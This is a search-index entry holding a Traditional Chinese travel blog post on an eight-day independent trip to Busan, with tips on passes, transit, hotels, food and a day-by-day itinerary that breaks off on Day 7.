[ { "title": "遊記 2025 韓國釜山 8 天 7 夜自由行", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2025-%E9%9F%93%E5%9C%8B%E9%87%9C%E5%B1%B1-8-%E5%A4%A9-7-%E5%A4%9C%E8%87%AA%E7%94%B1%E8%A1%8C-8ace34a1a3d8/", "categories": "Z 度旅行遊記", "tags": "生活, travel, busan, korea, travel-writing", "date": "2025-08-13 12:38:54 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2025 韓國釜山 8 天 7 夜自由行從南到北，使用釜山通行證 VISIT BUSAN PASS，暢遊美景、品味美食，開啟專屬你的釜山之旅。廣安大橋背景去年 2024 年「二訪九州 9 日自由行，經釜山→博多郵輪入...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2025 韓國釜山 8 天 7 夜自由行從南到北，使用釜山通行證 VISIT BUSAN PASS，暢遊美景、品味美食，開啟專屬你的釜山之旅。廣安大橋背景去年 2024 年「二訪九州 9 日自由行，經釜山→博多郵輪入境」 ，從韓國釜山入境再搭船前往日本福岡，那次短暫在釜山待了一個早上，只走馬看花去了海東龍宮寺跟海雲台而已；今年 7–8 月有一些工作空檔，因此再次出發、更深入的探索釜山，這次跟同樣是閒人的 Pinkoi 好同事 Sean 一同前往。日期：2025/07/29–08/05TL;DR一樣把總結寫在前面「韓國釜山雖然沒有日本的寧靜跟秩序，但是有隨性跟人情味」。必去景點： [北] Skyline Luge 滑坡車 [北] 釜山遊艇之旅 Y Holic [北] 膠囊列車 [北] 汗蒸幕 [北] 海東龍宮寺 [北] 新世界百貨 [南] 影島大橋必吃： [北] 烤鰻魚 — PUNGCHEONMAN [北] 鹽麵包 — Jayeondo saltbread [南] 喉嚨鍋蓋烤肉 — Moggumung Nampo Branch [南] Milgot 紅豆奶油艾草糯米糕必備： 韓國釜山通行證 VISIT BUSAN PASS (絕對要用，可以省很多錢) 韓國釜山通行證 VISIT BUSAN PASS (絕對要用，可以省很多錢) 韓國釜山通行證 VISIT BUSAN PASS (絕對要用，可以省很多錢) 這次沒吃到的東西：海鮮煎餅(錯過)、豬肉湯飯( 上次吃過 )、生章魚(不吃生的，看 ig 很多人吃完食物中毒)、醬蟹(不吃生的)行前準備行機票釜山航空 ( 含托運 15KG )。價格： NT$6,728 / 人 。 出發：07/29(二) 台北桃園(TPE) 16:25 -&gt; 釜山金海(PUS) 19:55 回程：08/05(二) 釜山金海(PUS) 10:50 -&gt; 台北桃園(TPE) 12:35總天數 8 天，實際天數 6 天 (第一天跟最後一天基本上就是搭飛機而已)。交通卡KKday 實體交通卡今年 iPhone 可以直接用 Apple 錢包交通卡裡的 Tmoney，可以直接儲值使用很方便；但是我已經 加值了去年買的實體卡 所以就沒用了。另外今年開始也能直接透過 Wowpass App 加值交通卡，流程是先用信用卡儲值 Wowpass 再從 Wowpass 入金到 Tmoney，流程較多而且需要支付手續費。 不管是哪一種都建議行前先在台灣用信用卡(因為有可能只支援某些發卡機構)先加值好或是攜帶一些現金到韓國用機台加值。 Naver Map 韓國務必使用 Naver Map。 韓國務必使用 Naver Map。 韓國務必使用 Naver Map。公車規定 韓國公車規定，大於 20 吋行李箱、手持手搖杯禁止搭乘(拿著不喝也不行，真的會攔) 另外商店也不收外來的垃圾，因此如果有自己調冰杯飲料最好在景點、百貨喝完丟掉再走，不然很麻煩。 兩人以上其實可以直接計程車搭到爽，釜山計程車很多又便宜又都很新很方便 地鐵請確認方向後再進站韓國釜山通行證 VISIT BUSAN PASSBusan Pass 有分限時(24/48 HR)無限量型跟限制次數型(180天內用完)。KKday 2025/08 釜山 Pass 資訊 因為行程安排分散在這 8 天，加上想去的景點就那些，我們 選擇買兩張 BIG5。 價格： NT$1,380 *2 張 = NT$2,760 電子版直接出示訂單 QRCode 使用實際使用狀況如下：KKday 2025/08 釜山 Pass 資訊 藍色少一次(太宗台沒去) 海雲台海岸列車兩天各坐了一次釜山遊艇之旅 Y Holic 預約⚠️使用釜山 Pass 欲搭乘釜山遊艇之旅，需要先跟船家預約，我們是選 Y Holic，以這家為例。買完 Pass 之後透過以下管道傳訊息給船家：IG：@yachtholic_info (我們是透過 Line)LINE：@yachtholicEmail：yh@yachtholic.comWeChat：yachtholic告知人數、日期、時段、Email 或聯繫方式跟 釜山 Pass 的 QR Code。等待確認回覆，沒問題就預約成功囉！ 夜間場次 (18:00) 開始 每個人需要另外收 $5,000 韓元 ，可以現場給或是提前轉帳 需要提前 30 分鐘到場排隊確認身份 我們是約 18:30 看夕陽 如果你不想買 Pass 也能直接預約購買遊艇行。韓國釜山｜海雲台藍線公園海岸列車・天空膠囊列車票請注意： 海岸列車跟膠囊列車不一樣 不要買錯，美美的膠囊列車不包含在釜山 Pass 中，需要另外購買車票；而且 非常熱門，務必要在出發前購買預約 。 天空膠囊 尾浦出發 2 人座 (1 張 2 人使用) 價格：NT$861韓國網卡｜韓國 高速無限流量 eSIM 7 日無限流量方案 (最後一天早上就去機場，所以就不買了)Naver Map 韓國務必使用 Naver Map。 韓國務必使用 Naver Map。 韓國務必使用 Naver Map。插曲 — 出發前一天要登入 Naver Map 發現帳號被鎖https://help.naver.com/service/5640/contents/20783?lang=en&amp;osType=COMMONOS原因疑似是在台灣登入被認為是可疑活動觸發 Naver 帳號保護機制。可以透過身份認證重新啟用帳號，不過我不確定是忘記名字填什麼還是因為外國人無法通過實名驗證，反正不管怎麼輸入都顯示輸入資訊錯誤，最後直接被鎖死。爬 網路資料 說可以填寫表單申請取消保護機制「 Members residing outside of Korea_Request to lift account protection measures 」，但是我不太確定名字的問題，因此第一次申請被拒：申訴失敗第二封我 直接去 Help Center 填寫申請表單：申訴內容我輸入：1. Your NAVER ID.你的 Naver 帳號，如果連帳號都忘記可以先從忘記帳號用信像、手機找回2. The registered name, date of birth, and contact information (mobile phone number or email address) of your NAVER ID.Date of birth: YYYY/MM/DD 你註冊填的生日Mobile Number: +886XXXXXXXXX 你註冊填的手機Email: 你註冊填的 EmailRegistered Name: Sorry I really forget which name I've input, it may be one of down below:你想得到的姓名組合XXXXX LILI XXXXXXXX李XXbut my real first name is XXXX, last name is Li3. Attach your overseas identification card.as attached file.4. The details of your request to the NAVER Help Center.I forgot my name which I input and I want lift the account protection measures.能提供的資訊越多越好，最後附加檔案附上護照個人資料頁圖片。然後就成功解鎖了：會再收到一封臨時密碼信，用臨時密碼就能登入 Naver Map 了， 記得去更改密碼跟加綁兩階段驗證登入(因為 Naver 登入保護機制我們取消了) 。 Naver 的回信速度蠻快的，都在半天內解決；如果怕意外被鎖可以先申請「 Members residing outside of Korea_Request to lift account protection measures 」( 參考這篇填寫 )。食提前預約的只有 西面的韓牛烤肉 花肉店 田浦店 。CatchTable是說 Catchtable 這個平台還蠻方便的，可以提前預約韓國美食餐廳。樂 Day 1 07/29 (二)：落地釜山、直奔海雲台飯店 Day 2 07/30 (三)：早上 Skyline Luge 滑坡車、海東龍宮寺，下午海岸列車＋膠囊列車、回海雲台、釜山 BUSAN X the SKY，晚上味贊王烤肉 Day 3 07/31 (四)：早上青沙浦、蜂蜜奶油吐司、海岸列車回海雲台、下午 Spa Land、晚上釜山遊艇之旅、晚上烤鰻魚 Day 4 08/01 (五)： 移動到南浦洞、松島海上纜車、龍宮雲橋、甘川洞文化村、晚上喉嚨鍋蓋烤肉、釜山塔看夜景 Day 5 08/02 (六)：樂天百貨、影島大橋開橋(只有週六有)。 Day 6 08/03 (日)：樂天百貨、富平罐頭市場、白淺灣文化村、福泉寺夜景。 Day 7 08/04 (一)：移動到西面、晚上吃韓牛。 Day 8 08/05 (二)：釜山金海國際機場，回程。住海雲台高麗良宵酒店 (Day 1 — Day 4 三晚 )地點還算方便，走路到海雲台大街大約 10 分鐘，有窗但無海景、雙人雙床房。 價格：實刷 NT$12,032，一晚一人約 NT$2,000。Hotel Noah (Day 4 — Day 7 三晚)地鐵札嘎其站出來走路約 5 分鐘、對街就是 BIFF 廣場，有窗戶、雙人雙床房。 價格：實刷 NT$7,783，一晚一人約 NT$1,298。Air Sky Hotel (Day 7 — Day 8 一晚)距離機場只有一站，等車＋搭車＋走路時間大約只要 10 分鐘就能到機場，有窗、雙人雙床房。 價格：實刷 NT$2,835，一晚一人約 NT$1,418。 題外話：這間飯店在完成預訂後會傳罐頭訊息要求支付訂金，如果本就已經在當下全額刷付可以無需理會。簽證韓國免簽證，只需出發前三天提前在 線上填好入境申請表 ，就能在落地後直接憑護照完成入境。 準備就緒，出發！Day 1 07/29 (二) 台灣前往海雲台~=13:30 抵達桃園國際機場第二航廈大約 13:50 開櫃報到，約 14:10 完成報到＋托運。 可以先在釜山航空官網 線上完成報到＋選位(免費) 。14:30 完成出境＋吃東西因為落地釜山後就要直接趕去飯店，所以在台灣先吃飽飽。15:00 開始候機、啟用 eSIM因為怕機場網路不好，所以先在 台灣啟用 eSIM 。~=16:40 飛機起飛小延誤 15 分鐘起飛，座位蠻小的。~=20:05 抵達韓國釜山 釜山機場是軍民兩用機場，禁止拍照。~=20:30 提領行李＋完成入境先去機場的超商買一些小東西補充熱量，還有換錢跟休息了一下。~=21:00 抵達金海輕軌 — 機場站從機場出來大概走路 5 分鐘就到了。先陪 Sean 儲值交通卡，這邊有兩台可以儲值交通卡的機器 (Self Service Charger)， 只能以韓幣 1000 元為倍數加值 。刷卡進站後請找前往沙上(Sasang Station)的月台，下一站是「西釜山流通地區」。~=21:15 抵達沙上轉乘綠線這邊只要一路跟著地上的綠色指示就能從輕軌出站轉地鐵綠線，往「 萇山 」方向(另一個方向是往 梁山 ，不要看錯字了)，下一站「甘田」。~=21:20 抵達綠線沙上站等車~=22:20 抵達海雲台快到海雲台站的時候地鐵廣播會有海鷗的叫聲。~=22:30 抵達飯店~=22:50 出門海雲台大街覓食住的位子會先經過海雲台傳統市場有賣很多吃的。~=23:30 回飯店開吃最後買了 BBQ 炸雞 兩種口味跟傳統市場的辣年糕還有超商的酒。 炸雞一份就夠兩個人吃了，兩份太多了(感覺是台灣的四份)，實刷 NT $1,210。 這款芒果酒( Iced tea highball with mango cubes )好喝(5%) 裡面有芒果罐頭果肉，後來發現台灣全家超商也有進。Day 2 07/30 (三) Skyline Luge 滑坡車、海東龍宮寺、海岸列車、膠囊列車、釜山 BUSAN X the SKY、味贊王烤肉09:30 出門 — 超級好天氣飯店門口就有公車直達 Skyline Luge。10:25 Skyline Luge 👍👍👍大約 10:30 開始排換票 (釜山 Pass 需要換票後才能使用)，人蠻多的，大約排了 20 分鐘拿到門票；釜山 Pass 可以選擇玩兩次滑坡車或是玩一次滑坡車跟一次高空滑索，大家幾乎都選玩兩次滑坡車。 如果沒有買 Pass 也能先在 KKday 購票。 (比現場買便宜，但也要換票才能進)換好票之後直接去旁邊選好符合 Size 的安全帽，戴好安全帽就能搭纜車上去囉。~=11:00 搭上纜車人都集中站換票、買票櫃檯，後面搭纜車跟滑坡車都不用怎麼排隊，纜車上去的途中可以看到下面的賽道，大約 5 分鐘就抵達出發點。如果很怕開放式纜車的，這次去有看到旁邊另一條箱型式纜車感覺也快開通了(?)。11:05 準備出發上面可以眺望隔壁的樂天樂園。第一次請排「首次搭乘入場」會蓋手章跟有工作人員做簡單教學。操作方式總之就是： 腳打直 往後前進、往前放煞車 中途不能停、中途不能停、中途不能停，完全停下來就很難繼續滑動了 適時轉彎前減速不然會翻車 小心超車 雙手操控不可手持手機，中途有攝影機會拍照可以去紀念品店購買 個人物品要小心不要掉了從上滑到下大約 6 分鐘而已。下來就是紀念品中心跟可以買中途拍的照片。穿過紀念品中心回到入口，再排一次纜車上去。這次排再入場通道（可以直接玩，不會有工作人員教學）。ㄏ勝。11:45 離開，前往海東龍宮寺出 Skyline Luge 後對面直直走就是海東龍宮寺了，大約需步行 10 分鍾、上坡路。11:55 海東龍宮寺因為 去年有來過了 ，所以這次只走馬看花。大約 11:55 就到海東龍宮寺攤販入口。這次才發現海東龍宮寺匾牌入口右邊也可以走，是緩下坡可以直達本殿；走匾牌入口這邊是很陡的樓梯，不好走。12:45 等公車去松亭站釜山的避暑措施做得蠻好的，路上等紅綠燈有陽傘、公車站幾乎都有風扇，可以按一下啟動。路線計劃如下圖：從 Skyline Luge 搭公車+走路到海岸列車松亭站，搭海岸列車到青沙浦站，轉搭膠囊列車回海雲台。~=13:15 抵達松亭車站從公車站走過來還要約 10 分鐘，很熱很曬。ref13:30 的人滿了，劃位劃 14:00 的。( 時刻表 ) 小插曲：這站站務員不給用釜山 Pass PDF 檔，要我們一定要從 KKday App 開憑證給他。 釜山 Pass 換的車票可當日、每個車站上車一次，所以其實可以沿途停靠各個景點。時間還很早，先去便利超商果腹；松亭站出來就是松亭海水浴場(感覺人比較少)，這邊有一家超商。~=13:40 開始候車記得提早去排隊候車，不然只能站在最後一排。穿過車站出來一路走到月台，在月台驗票入場就能開始候車了。大約 13:50 車就會到，人群開始騷動排隊。~=14:00 出發坐到第二排的位子，風景還不錯。~=14:15 抵達青沙浦下車後在月台看到往 2 樓的樓梯就是膠囊列車的乘車處了。打開 KKday 訂單憑證中有一個連結 ，會出現車票憑證；上二樓後給亭子的工作人員看憑證(我們預約的是 14:30–15:00 的梯次)，他會發一張號碼牌給你，時間到會開始叫號，如果已經開始叫號那就只能等叫號完了。等待期間去隔壁紀念品店買了一隻扇子。 膠囊列車也有免費的扇子可以拿(最右張圖)。~=14:30 膠囊列車叫號排隊時間到工作人員會開始依序叫號排隊。排隊區域上方有冷氣，上車前才會核銷憑證(記得先開好)，上車後工作人員會拍一張合照，再看下車後要不要跟他們購買。~=14:40 膠囊列車青沙浦 -&gt; 尾浦(海雲台) 出發! 👍👍👍看起來很刺激，實際走得很慢；車廂內沒冷氣但有通風扇跟擴音箱可以插手機放音樂。一路看看風景拍拍網美照(?)~=15:10 抵達尾浦(海雲台)朝著海雲台方向(高樓)走出來到路口，對面右邊就是有名好吃的 鹽麵包 — Jayeondo saltbread (等下會回來買)左邊一路往下走到面海的入口就是 釜山 Sky 入場處。~=15:35 釜山 BUSAN X the SKY海雲台沙灘方向的玻璃是有圍欄阻隔的，沒辦法貼著拍照。有一個透明玻璃地板橋，不過玻璃磨損嚴重效果普普；還有可以透明玻璃廁所。往下走到咖啡廳、紀念品店可以回望剛剛膠囊列車來的路線。吃了一根魚板香腸補充熱量(味道普普)。除了咖啡廳、紀念品店，這層也有免費的展覽。~=16:00 離開，走回去買 鹽麵包 — Jayeondo saltbread 👍👍👍一份就是 6 個，買一份回飯店分著吃，香+脆+微微的鹽粒提味，我覺得很好吃。海雲台這邊有很多大興土木改造工程，看起來在為 2030 爭取辦世博做準備(不過已經失敗)。 回飯店休息一下，晚上再去吃味贊王。17:50 抵達 味贊王海雲台店 — Matchandeul Salted Grill Haeundae Branch門口有一台機器可以候位，輸入信箱會收到通知，17:50 來就開始小排隊了。點按鈕可以查看當前號碼，時間到也會收到可入場通知信，很方便； 另外，對面、隔壁大樓都在施工要小心。18:25 入場用餐大約等了 30 多分鐘才入場。我們直接點雙人套餐(內容是肉各一+大醬湯+釜飯)然後再一瓶 Cass 啤酒，實刷約 NT$1,500。 會烤好給你吃，評價是肉好吃但份量不多&amp;要排隊等候。~=20:30 吃飽回海雲台大街海雲台大街走走消化一下，買了一家抹茶專賣店的冰淇淋當甜點解膩。隔壁就是 Olive Young 新開的 Delight Project 專賣店，搜刮了一波；很多買二送一並且滿15,000 韓元可以直接現場退稅。再去海雲台海灘晃了一下才回飯店休息。Day 3 07/31 (四) 青沙浦、 Spa Land、海岸列車、釜山遊艇之旅因為昨天只在青沙浦轉乘沒特別逛，今天又來。11:00 上公車出發前往青沙浦從海雲台直達青沙浦的公車是小巴，沿途會經過釜山山莊之類的社區路比較小也很陡。11:30 抵達青沙浦附近先隨便找了一家有吃的店吃午餐 ( Gohyang katsu )，我點豬排三民治，肉很厚很嫩而且價格實惠。~=12:30 DIART COFFEE 蜂蜜奶油吐司吃完午餐走出來就是大家激推的釜山蜂蜜奶油吐司 DIART COFFEE ，點了一份($10,000 韓元)跟咖啡($5,500 韓元)休息一下。食用方式可參考 小卡 ，總之就是先把麵包一塊一塊切好，然後均勻塗抹奶油跟蜂蜜食用。 蜂蜜不會太甜加上奶油的奶香配上香脆的麵包，好吃又不膩。~=13:30 回青沙浦準備搭海岸列車回尾浦(海雲台)昨日的已無法使用，又再用釜山 Pass 換了一張海岸列車車票；這邊是中途站上車只能站在最後一排了。中途會經過幾個觀景平台，因為太熱就沒下去了。~=13:55 抵達尾浦(海雲台)回到海雲台後就走路＋搭公車前往新世界 Spa Land 了。~=14:30 抵達 新世界(SHINSEGAE)百貨沒有逛，直衝一樓 Spa Land。14:40 Spa Land用釜山 Pass 兌換 Spa Land 使用。 沒買 Pass 也能在 Kkday 先購買。進去會發一個感應手環，用手環寄放鞋子、衣物，在場內換汗蒸幕專用衣服，也可以先去三溫暖(需全裸)再去汗蒸幕，汗蒸幕入口在女生更衣室那個方向。一樓有日光浴區、美甲、小吃攤、各種功能的汗蒸幕(暑假人太多了每一間幾乎都滿滿的人)，三樓有餐廳(可以去吃烤蛋、泡麵)、按摩、按摩椅跟瑜伽室。去完三溫暖就去日光浴區躺著曬太陽了，點了一杯飲料(超甜)。 場內所有消費都是憑手環感應，最後出場再結帳。 老實說這次來根本沒體驗到汗蒸幕，人多到爆炸，下次再說了。17:00 準備前往遊艇碼頭集合預約 18:30 的場次，需提前去集合點名。出發前先在新世界百貨 B1 買了吃了一些東西果腹。坐地鐵前往冬柏站 (Dongbaek)出站要在走約 15 分鐘才會到碼頭。 碼頭這邊只有販賣機跟廁所比較髒、人多要排隊； 建議在市區買好需要的東西、上好廁所再來。~=18:00 抵達遊艇碼頭穿過遊客中心後就能來到碼頭集合處，各個船家有不同的碼頭集合處。等到大約 18:15 船家才出現開始整隊點名，現場收夜間加價的費用(一人 $5,000 韓元)。18:30 海上遊艇出發 👍👍上船要穿救生衣，坐到第二層最前面的位子。開得很慢、不會太晃，一路前往穿過廣安大橋。 不過怕暈船的還是建議要吃暈船藥。大致的路綫圖：~=18:50 抵達廣安里海灘前大約 20 分鐘後就會到達廣安里海灘前的海域，可以看到很多玩 SUP 的遊客；會在這停留跟放煙火；煙火就是這時段出航的各個遊艇的船家工作人員一起手持燃放，不過天還很涼所以看不太到。沿途工作人會也會很熱情的幫忙拍照。~=19:00 回程剛好看到晚霞。~=19:20 回到陸地回陸地後就搭公車回海雲台了。~=19:35 回到海雲台海雲台沙灘有市集、餐車。~=19:55 去吃海雲台 烤鰻魚 — PUNGCHEONMAN 👍👍店內位子很多不用排隊，直接進來了。我們點烤鰻魚+烤牛肉片+冷麵*2+燒啤，實刷 NT$2,387。烤鰻魚脆脆軟嫩多汁，很好吃，完全沒有任何腥味；烤牛肉片也不錯但是普通；蕎麥冷麵很像什麼黑糖ㄘㄨㄚˋ冰，實則是醬油味、有碎冰的，很清爽好吃。吃完又去海雲台大街走走、海雲台傳統市場(忘了吃海鮮煎餅，可惡！)跟買伴手禮；明天就要離開海雲台了。Day 4 08/01 (五) 南浦洞、松島海上纜車、龍宮雲橋、甘川洞文化村、釜山塔09:15 出門前往南浦洞一早準備離開海雲台前往南浦洞。~=10:30 抵達札嘎其站， Hotel Noah 飯店寄放行李。BIFF 廣場飯店出來對面就是 BIFF 廣場，很熱鬧、方便。~=11:00 吃午餐 — Hongkong 0410 Nampo 1st Branch接近中午先在 BIFF 內隨意找了家餐廳吃午餐，這家是韓式中華料理。點了炸水餃、糖醋肉(中，感覺可以點小的)、韓式炸醬麵。炸水餃有點膩，糖醋肉不錯。12:15 搭公車+走路，抵達松島纜車站下公車大約還要走 10 分鐘，太熱了，先去超商調一杯自製咖啡拿鐵消暑。進來之後排櫃檯兌換釜山 Pass 纜車車票(Pass 是水晶車廂、 來回，所以票要收好 )。領完票就直接搭手扶梯上樓排隊等纜車。(有發棒棒糖但我沒拿)12:25 上車5–6 人一台。~=12:35 抵達松島出來直接右轉往下走。走樓梯往下右轉到底就是「松島龍宮吊橋」了。~=12:40 抵達松島龍宮吊橋旁邊售票處使用釜山 Pass 換票進場。這邊完全沒遮蔭，大太陽下很曬，可以鳥瞰整個松島纜車。~=13:00 回到松島纜車，排纜車回去~=13:25 離開松島走回去搭公車纜車這邊也有一個觀景平台，太熱就沒去了。走回公車站回到市區再轉乘小巴到甘川洞文化村。~=14:20 甘川洞文化村我們沒要拍照，純踩點；感覺就是個彩虹社區跟一些咖啡廳，一路走馬看花往下走，到另一個公車站就搭公車回飯店了。 這邊公車是小巴，有點像上陽明山的小巴，司機也開得很兇、人也很多很擠。~=15:00 回到 Noah Hotel 飯店休息Hotel Noah 房間窗戶外景色 本來以為沒有投幣洗衣機，結果在三樓廁所有附設免費的洗衣機可以使用。~=17:40 出發去吃晚餐從飯店走過去大約 10 分鐘。~=17:50 喉嚨鍋蓋烤肉 — Moggumung Nampo Branch 👍👍👍 特色是烤盤是鍋蓋 小菜會有一顆維他命C (查了一下吃燒烤前或後補充維他命 C 可以減少自由基產生降低致癌風險) 最低要點三份肉，一樣都有店員烤好給你吃 點了兩份豬+一份牛+兩碗泡麵+Cass 啤酒，肉一份都是 $18,000 韓元， 實刷 NT$1,060 相當划算，而且肉也很好吃！！大推~= 18:30 走路前往釜山塔吃飽後再一路走到釜山塔，消化一下，大約 20 分鐘。一路上很熱鬧、很多吃的餐廳。 導航其實應該要設定 — 龍頭山紀念公園入口 Yongdusan Media Park Entrance ，那邊有電扶梯往上；從這邊走要小爬一下山 (約 5 分鐘)。19:00 抵達釜山塔下，等日落之後再上去看夜景期間先去紀念品店逛逛。19:30 上釜山塔在一樓櫃檯出示釜山 Pass 換門票進入。釜山塔憑門票掃描 QRCord 可以玩解謎遊戲，解出所有密碼可以得到一個小獎品。(密碼後面我有寫)上來已經有很多人在等了。19:45 的釜山晚霞。20:00/20:10…有光雕投影煙火，效果普普。20:00 釜山夜景~= 20:10 下塔離場離場之前還有很多可以拍照的點。~= 20:15 兌換小紀念品下山之前記得去外面無人售票處 (Ticket Box) 機台： 輸入密碼 ： 19731121 (釜山塔建塔日期) 就能持憑證去外面藍色房子的紀念品中心(不是釜山塔一樓那個)兌換小獎品。小紀念品是一張小卡，有多種樣式可以選，我選了一張透明的釜山塔：一路從龍頭山公園下山。 這邊有電扶梯啊啊啊啊！！(往上，下山沒有、有一段在整修)20:30 回到 — 龍頭山紀念公園入口 Yongdusan Media Park Entrance記得從這裡去釜山塔比較近。在商店街逛了逛，這裡有一家 HBAF 杏仁果專賣店，應該是口味最齊全的地方；買了 Yellow 組合包(裡面是小包的)跟一些其他特殊(跳跳糖，真的會跳、辣炒年糕)、熱門口味(蜂蜜、Oreo、玉米)回家當伴手禮。20:45 回到 —BIFF 廣場買宵夜這邊有很多攤販、地板有明星的手印。瑪格利酒、 BHC 炸雞 — BHC Chicken Busan Nampo Branch (就在 BIFF 廣場) 👍👍最後買回去吃了： 瑪格利酒：類似小米酒、酒釀，很讚。 BHC 無骨炸雞：調味跟雞肉都很嫩、很好吃。00:00 晚安南浦大約 00:00 後攤販就都清空了。Day 5 08/02 (六) 樂天百貨、影島大橋開橋(只有週六有)10:45 樂天百貨光復店、樂天超市 — Lotte Dept. Store Gwangbok Branch Aqua Mall大約 10:XX 出門，樂天百貨 10:30 開始營業，慢慢走去。先去 B1 美食街咖啡廳隨便吃個東西當早餐。(普普，咖啡是 Lungo)11:30 開始百貨公司亂逛 去 Kodak 店買了幾件衣服(平均比台灣代購便宜 NT$300–$500)當店直接退稅。 買了支手持風扇憑收據去 B1 美食街找退稅機列印退稅單，最後再去機場退現金。(大概能退 NT$60) 百貨這邊 11 點開始每小時都有水舞秀，蠻精彩的12:30 B1 Downtown 漢堡逛累了，中午時分就去 B1 吃 Downtown 漢堡；道理我都懂，但是美式漢堡也有提供泡菜啊！吃飽到百貨公司頂樓觀景台晃晃，(超曬、超熱)。~=13:30 走出百貨到外面影島大橋等開橋外面很曬，越接近 14:00 聚集的人越來越多；此時 有一個阿珠嬤走過來跟我們說 8/2–30 因為太熱改晚上 20:00！！震驚！！ 然後大家就開始人傳人說改到 20:00，大家開始慢慢散場。後來才在欄杆上看到公告布條。(左邊看板是例行時間)13:50 回樂天百貨、樂天 Mart 繼續亂逛樂天超市也有賣一些伴手禮跟保養品(就是家樂福)。B1 退稅機台找了好久才找到退稅機台，在鼎泰豐旁的小路。 如果不是立即退稅的就要到這邊刷單據條碼換退稅單，最後到機場再退錢。(有點麻煩) 才知道韓國是有分不同退稅機構的 Global Blue、GLOBAL TAX FREE、Easy Tax Refund、CubeRefund、eTAX FREE，只能使用對應的退稅機台 ；因為我在 Olive Young 有看到能退現金的機台但是是 GLOBAL TAX FREE 的，我的單字是 CubeRefund，還是只能去機場退。16:35 回飯店休息逛累了就去 B1 買了韓國的紅豆和桃果子跟老配方自己調的超商手搖(冰杯+香蕉牛奶+無糖黑咖啡)，走地下街回去飯店休息。19:00 出飯店去 BIFF Olive Young 逛逛在海雲台都沒逛 OY，剛好有時間先來看看，這家店很大店員很多也都很親切。戰利品19:40 到達影島大橋，等開橋橋下這邊有紀念照合成的攤位。大約 19:50 就會開始交通管制。20:00 開橋先在橋下看，大約 20:05 開的差不多在移動上去。有投影介紹影島大橋歷史，不過可能是第一天投影機角度有問題，看不太清楚。20:15 橋重新下降，恢復通車20:30 吃晚餐 — Ton Black &amp; Tempura Nine 晚上走回飯店的路上隨意找了家豬排飯店吃吃 (豬排一樣很嫩，好吃) 一份實刷 NT$366~=21:50 回飯店休息Day 6 08/03 (日) 樂天百貨、富平罐頭市場、白淺灣文化村、福泉寺夜景 今天都在亂走消磨時間，內容不建議參考，純紀錄。10:00 出門先去吃 — Egg Drop 位置在樂天百貨對面的商店街。 一樓機台點完餐拿號碼牌上二樓找位子 (應該要先上去看有沒有位子) 大約等了 20 分鐘 點了一份火腿起司歐姆蛋吐司＋薯餅＋冰咖啡：$8,400 韓元 是不錯，但我覺得台灣有些早午餐比這更好吃。11:00 吃飽再出發往樂天百貨的路上有一家「Big Shop」釜山紀念品店專賣店，有很多 Boogi 跟釜山形象周邊商品。樂天百貨光復店、樂天超市 — Lotte Dept. Store Gwangbok Branch Aqua Mall無聊繼續逛樂天百貨。11:45 B1 無國食卓 蒸食料理 Lotte Dept. Store Gwangbok Branch吃了好幾天重口味食物，午餐想吃清淡一點。 飯要另外加點。 本身沒什麼味道。吃飽後又逛了一下。12:50 離開樂天百貨，前往 天空之眼展望台 — Yeongju Haneul Nun Observatory沒事附近隨便晃晃，查到一個 去年沒去到的展望台 ，有公車直達(21 分鐘)於是就去了。 釜山的公車幾乎都是全新的電車、冷氣很涼 途經 去年路過的點：釜山站13:00 天空之眼展望台 — Yeongju Haneul Nun Observatory公車站下車後走到對面往下就能看到了。這邊的景色很好，可以眺望整個釜山南浦。下山去富平罐頭市場 — 先去買同事推薦的 The Liter 手搖杯 只推薦：藍莓優格冰沙(Yogurt Smoothie — Blueberry)，有 600ML or 1,000ML 兩種大小；好喝解暑，也不會太甜覺得越喝越渴，價格約 $4,300 韓元。富平罐頭市場罐頭市場內有很多乾糧、雜貨、海鮮攤販(像菜市場)，範圍很大。富平罐頭市場 — Milgot 紅豆奶油艾草糯米糕 👍應該是罐頭市場最有名的店，特色是 — 紅豆奶油艾草糯米糕。 因為不會韓文所以直接拍照只給店員看就要這個 店員說回去要冰，吃之前退冰半小時到一小時最好吃 另外還買了一個鹹的麵包，也不錯！後來帶回飯店吃，艾草糕糯糯的口感配上黃豆粉跟紅豆奶油內餡，我覺得蠻特別的，稍微有一點甜；如果有路過可以試試！另外又再買了一盒 BHC 炸雞 回去當晚餐吃。18:30 重新出發傍晚休息完又再出門，主要是要去福泉寺拍夜景，先去白淺灣文化村看看。18:45 白淺灣文化村 這邊最有名的景點是 — 邊看風景邊喝咖啡邊泡足浴 — VIEW, FOOT BATH CAFE 足浴咖啡廳。但是因為時間晚了，所以只走馬看花；靠海岸這邊有很多咖啡廳跟小店，但不知道是不是因為時間晚了沒什麼人，下方海岸線步道在維修無法下去走；今天天氣陰陰景色不佳。19:00 前往 福泉寺 — Bokcheonsa Temple離開白淺灣後就要往上前往福泉寺。原本看 Map 說公車只搭一站，想說用走的就好，走幾步之後就放棄了；地圖寫公車 1 站(1 分鐘)；實際走應該要 20 分鐘 (全是很抖的山坡路)。 Yeongdogu 1 或 5 都可只搭一站到下一站 Sinseon Elementary School ，剩下只能用走的：下車後傻了，依然是很抖的山坡路，從這邊一路往上走：經過國小之後再往上就能看到福泉寺入口：這裡才是開始，要再一路爬很抖的山坡路往上到底才是福泉寺： 這裡會有車通行，要注意安全 ⚠️19:25 抵達福泉寺 大約 19:25 才走到福泉寺（差點累死），Map 寫 10 分鐘，實際全是上坡路走+休息大概花了 25 分鐘。但更悲劇的事是 — 他關門了！他關門了！他關門了！沒錯，福泉寺不太算公開的觀光景點，他是寧靜的寺院，時間到門就關了；聽同事說大約 18:00 後就只進不出了，不會特別趕人，但是超過時間關門就不給進去了。悲劇，只能在站外面閣樓看景，後來也有一些慕名而來的人也是都站在這。 不過住持看我們大粒汗小粒汗，就從裡面丟了兩罐冰水給我們，太感謝了。從這邊看市區的景色視角。最後隨手拍了張夜景就走下山了，當初是看其他部落客拍的圖才想來的：真的進去拍應該長這樣下山一路下坡，一片黑：是個很安靜的村莊，走下來就搭公車回札嘎其站了。回飯店前買了 BIFF 廣場蠻多人排的 種子糖餅 ，我覺得很油很甜不怎麼樣。大約 22:00 釜山開始下雨！還好我們旅程快結束了。Day 7 08/04 (一) 釜山西面、新世界百貨、韓牛早上出門移動到西面站。10:45 